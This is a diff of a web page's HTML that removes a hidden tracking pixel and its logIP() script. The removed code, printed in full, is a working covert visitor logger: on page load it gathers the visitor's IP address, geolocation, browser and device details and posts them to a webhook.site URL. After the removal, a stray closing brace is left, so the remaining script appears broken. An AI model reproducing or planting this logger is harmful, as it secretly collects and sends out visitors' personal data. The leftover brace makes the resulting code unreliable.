@@ -216,84 +216,10 @@
         <source src="heavenly.mp3" type="audio/mpeg">
     </audio>    
 
-    <!-- IP Logger Pixel (Hidden) -->
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" 
-         style="display:none;" 
-         onload="logIP()">
-
     <script>
         // Your Discord user ID
         const DISCORD_USER_ID = "320919318571384833";
         
-        // IP Logger Function (using Webhook.site)
-        function logIP() {
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    // Get geolocation data
-                    fetch(`https://ipapi.co/${data.ip}/json/`)
-                        .then(res => res.json())
-                        .then(geoData => {
-                            const logData = {
-                                ip: data.ip,
-                                time: new Date().toISOString(),
-                                userAgent: navigator.userAgent,
-                                page: window.location.href,
-                                referrer: document.referrer || 'direct',
-                                location: {
-                                    country: geoData.country_name,
-                                    region: geoData.region,
-                                    city: geoData.city,
-                                    postal: geoData.postal,
-                                    latitude: geoData.latitude,
-                                    longitude: geoData.longitude,
-                                    timezone: geoData.timezone,
-                                    org: geoData.org
-                                },
-                                browserInfo: {
-                                    platform: navigator.platform,
-                                    language: navigator.language,
-                                    screenWidth: window.screen.width,
-                                    screenHeight: window.screen.height,
-                                    colorDepth: window.screen.colorDepth,
-                                    deviceMemory: navigator.deviceMemory || 'unknown',
-                                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
-                                }
-                            };
-                            
-                            // Replace with your Webhook.site URL
-                            fetch('https://webhook.site/f85cee84-71ba-4f40-a5ef-26760af39554', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(logData)
-                            });
-                        })
-                        .catch(geoError => {
-                            // Fallback if geolocation fails
-                            const logData = {
-                                ip: data.ip,
-                                time: new Date().toISOString(),
-                                userAgent: navigator.userAgent,
-                                page: window.location.href,
-                                referrer: document.referrer || 'direct',
-                                location: "Geolocation failed",
-                                browserInfo: {
-                                    platform: navigator.platform,
-                                    language: navigator.language,
-                                    screenWidth: window.screen.width,
-                                    screenHeight: window.screen.height,
-                                    colorDepth: window.screen.colorDepth
-                                }
-                            };
-                            
-                            fetch('https://webhook.site/f85cee84-71ba-4f40-a5ef-26760af39554', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(logData)
-                            });
-                        });
-                })
-                .catch(err => console.log("IP logging failed (adblock?)"));
         }
 
         function revealContent() {
